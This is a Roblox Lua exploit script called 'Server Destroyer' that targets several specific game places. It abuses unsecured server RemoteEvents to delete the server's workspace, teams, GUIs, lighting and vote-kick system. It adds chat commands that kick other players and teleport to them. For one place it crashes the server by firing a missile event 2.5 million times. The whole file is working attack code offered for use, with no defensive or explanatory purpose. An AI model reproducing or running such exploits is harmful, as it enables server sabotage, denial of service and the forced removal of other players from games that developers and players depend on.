if game.PlaceId == 11698235691 or game.PlaceId == 11940161478 or game.PlaceId == 12173240994 then
   game:GetService("StarterGui"):SetCore("SendNotification",
   {
      Title = "Server Destroyer",
      Text = "Loaded! Made by Gerashino#8015",
      Duration = 3
   }
   )
   local properties = {
      Color = Color3.fromRGB(0, 255, 0);
      Font = Enum.Font.FredokaOne;
      TextSize = 16;
   }
   properties.Text = "Server Destroyer. Made by Gerashino#8015"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Use /cmds to see all the commands."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Destroying Server..."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   wait(1)
   for _,w in pairs(workspace:GetChildren()) do
      main = workspace
      file = w.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end
   for _,t in pairs(game.Teams:GetChildren()) do
      main = game.Teams
      file = t.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end

   main = game.ReplicatedStorage
   file = "VoteKickGui"

   allfnm = main[file]
   local args = {
      [1] = main,
      [2] = allfnm,
      [3] = 0,
      [4] = 0,
      [5] = 0,
      [6] = 0,
      [7] = 0,
      [8] = "",
      [9] = allfnm,
      [10] = main
   }

   game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))

   for _,script in pairs(game.ReplicatedFirst:GetChildren()) do
      main = game.ReplicatedFirst
      file = script.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end
   for _,gui in pairs(game.StarterGui:GetChildren()) do
      main = game.StarterGui
      file = gui.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end

   for _,l in pairs(game.Lighting:GetChildren()) do
      main = game.Lighting
      file = l.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end

   properties.Text = "Server has been successfully destroyed!"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)

   function Teleport(params)
      if params[2] == "random" then
         local getrandom = math.random(1, #game.Players:GetPlayers())
         local getplr = game.Players:GetPlayers()[getrandom]
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[getplr.Name].Character.HumanoidRootPart.CFrame
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Teleporting to "..getplr.Name.."."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      else
         for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():sub(1,#params[2]) == params[2]:lower() or v.DisplayName:lower():sub(1,#params[2]) == params[2]:lower() then
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame
               wait(1)
               local properties = {
                  Color = Color3.fromRGB(0, 255, 0);
                  Font = Enum.Font.FredokaOne;
                  TextSize = 16;
               }
               properties.Text = "Teleporting to "..v.Name.."."
               game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
            end
         end
      end
   end

   function Rejoin()
      game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
      wait(1)
      local properties = {
         Color = Color3.fromRGB(0, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      properties.Text = "Rejoining..."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   function CommandsList()
      local properties = {
         Color = Color3.fromRGB(0, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      wait(1)
      properties.Text = "Commands:"
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/teleport [Player] (Aliases: tp, goto) - Teleports you to any player."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/rejoin (Aliases: rj) - Rejoin."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   game.Players.LocalPlayer.Chatted:Connect(function(msg)
   local args = string.split(msg," ")
   local cmd = string.lower(args[1])
   if cmd == "/tp" or cmd == "/teleport" or cmd == "/goto" then
      Teleport(args)
   elseif cmd == "/cmds" or cmd == "/help" then
      CommandsList()
   elseif cmd == "/rejoin" or cmd == "/rj" then
      Rejoin()
   end
   end)
elseif game.PlaceId == 12988092080 then
   game:GetService("StarterGui"):SetCore("SendNotification",
   {
      Title = "Server Destroyer",
      Text = "Loaded! Made by Gerashino#8015",
      Duration = 3
   }
   )
   local properties = {
      Color = Color3.fromRGB(0, 255, 0);
      Font = Enum.Font.FredokaOne;
      TextSize = 16;
   }
   properties.Text = "Server Destroyer. Made by Gerashino#8015"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Use /cmds to see all the commands."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Destroying Server..."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   wait(1)
   for _,w in pairs(workspace:GetChildren()) do
      local yeah = {
         [1] = w
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end
   for _,t in pairs(game.Teams:GetChildren()) do
      local yeah = {
         [1] = t
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end

   local yeah = {
      [1] = game.ReplicatedStorage.VoteKickGui
   }

   game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))

   for _,script in pairs(game.ReplicatedFirst:GetChildren()) do
      local yeah = {
         [1] = script
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end
   for _,gui in pairs(game.StarterGui:GetChildren()) do
      local yeah = {
         [1] = gui
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end

   for _,l in pairs(game.Lighting:GetChildren()) do
      local yeah = {
         [1] = l
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end

   properties.Text = "Server has been successfully destroyed!"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)

   local function findplr(plr)
      for i,v in pairs(game.Players:GetPlayers()) do
         if v.Name:lower():sub(1,#plr) == plr:lower() or v.DisplayName:lower():sub(1,#plr) == plr:lower() then
            return v;
         end
      end
      return nil
   end

   function Teleport(params)
      if params[2] == "random" then
         local getrandom = math.random(1, #game.Players:GetPlayers())
         local getplr = game.Players:GetPlayers()[getrandom]
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[getplr.Name].Character.HumanoidRootPart.CFrame
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Teleporting to "..getplr.Name.."."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      else
         for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():sub(1,#params[2]) == params[2]:lower() or v.DisplayName:lower():sub(1,#params[2]) == params[2]:lower() then
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame
               wait(1)
               local properties = {
                  Color = Color3.fromRGB(0, 255, 0);
                  Font = Enum.Font.FredokaOne;
                  TextSize = 16;
               }
               properties.Text = "Teleporting to "..v.Name.."."
               game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
            end
         end
      end
   end

   function Kick(pr)
      if pr[2] == "all" then
         for _,v in pairs(game.Players:GetPlayers()) do
            local yeah = {
               [1] = v
            }

            game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
         end
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Everyone has been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      elseif pr[2] == "me" then
         local yeah = {
            [1] = game.Players.LocalPlayer
         }

         game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "You have been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      elseif pr[2] == "others" then
         for _,v in pairs(game.Players:GetPlayers()) do
            if game.Players.LocalPlayer.Name ~= v.Name then
               local yeah = {
                  [1] = v
               }

               game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
            end
         end
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Other Players were kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      elseif pr[2] == "random" then
         local getrandom = math.random(1, #game.Players:GetPlayers())
         local plr = game.Players:GetPlayers()[getrandom]
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = plr.Name.." has been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
         local yeah = {
            [1] = plr
         }

         game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
      else
         local plr = findplr(pr[2])
         wait(1)
         local properties = {
            Color = Color3.fromRGB(0, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = plr.Name.." has been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
         local yeah = {
            [1] = plr
         }

         game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
      end
   end

   function Rejoin()
      game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
      wait(1)
      local properties = {
         Color = Color3.fromRGB(0, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      properties.Text = "Rejoining..."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   function CommandsList()
      local properties = {
         Color = Color3.fromRGB(0, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      wait(1)
      properties.Text = "Commands:"
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/kick [Player] (Aliases: k) - Kick player(s)."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/teleport [Player] (Aliases: tp, goto) - Teleports you to any player."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/rejoin (Aliases: rj) - Rejoin."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   game.Players.LocalPlayer.Chatted:Connect(function(msg)
   local args = string.split(msg," ")
   local cmd = string.lower(args[1])
   if cmd == "/kick" or cmd == "/k" then
      Kick(args)
   elseif cmd == "/tp" or cmd == "/teleport" or cmd == "/goto" then
      Teleport(args)
   elseif cmd == "/cmds" or cmd == "/help" then
      CommandsList()
   elseif cmd == "/rejoin" or cmd == "/rj" then
      Rejoin()
   end
   end)
elseif game.PlaceId == 9329726891 then
   game:GetService("StarterGui"):SetCore("SendNotification",
   {
      Title = "Server Destroyer",
      Text = "Loaded! Made by Gerashino#8015",
      Duration = 3
   }
   )
   local properties = {
      Color = Color3.fromRGB(0, 255, 0);
      Font = Enum.Font.FredokaOne;
      TextSize = 16;
   }
   properties.Text = "Server Destroyer. Made by Gerashino#8015"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Crashing Server..."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Server has been successfully crashed!"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   for i = 1, 250000 do
      local args = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args))
      local args_2 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_2))
      local args_3 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_3))
      local args_4 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_4))
      local args_5 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_5))
      local args_6 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_6))
      local args_7 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_7))
      local args_8 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_8))
      local args_9 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_9))
      local args_10 = {
          [1] = CFrame.new(-1494.8148193359375, 261.584716796875, -858.8607177734375) * CFrame.Angles(3.141592502593994, 0.8347081542015076, -3.1414706707000732),
          [2] = Vector3.new(-1490.910400390625, 258, -855.2946166992188),
          [3] = game:GetService("Lighting"):FindFirstChild("m1a1 bazooka"),
          [4] = 50,
          [5] = BrickColor.new(1010),
          [6] = 14,
          [7] = 30,
          [8] = 150
      }
      game:GetService("Lighting").MissileFireEvent:FireServer(unpack(args_10))
   end
end
